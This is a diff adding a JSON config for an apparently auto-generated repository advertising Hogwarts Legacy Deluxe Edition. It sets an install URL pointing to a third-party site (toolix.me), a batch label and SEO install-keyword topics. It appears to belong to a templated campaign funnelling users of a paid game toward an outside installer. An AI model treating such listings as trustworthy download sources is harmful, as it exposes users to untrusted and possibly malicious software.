@@ -1,0 +1,23 @@
+{
+  "repo": "hogwarts-legacy-deluxe-edition",
+  "product": "Hogwarts Legacy Deluxe Edition",
+  "kind": "game",
+  "install_type": "toolix",
+  "install_url": "https://toolix.me/",
+  "batch": "new4",
+  "format": "license-md-toolix-v1",
+  "category": "open-world",
+  "topics": [
+    "hogwarts-legacy",
+    "open-world-pc",
+    "room-of-requirement",
+    "hogwarts-windows",
+    "photo-weather-2026",
+    "how-to-install-hogwarts",
+    "hogwarts-desktop-package",
+    "house-quest-suite",
+    "beast-gear-desk",
+    "hogwarts-deluxe-edition"
+  ],
+  "site": "toolix.me"
+}
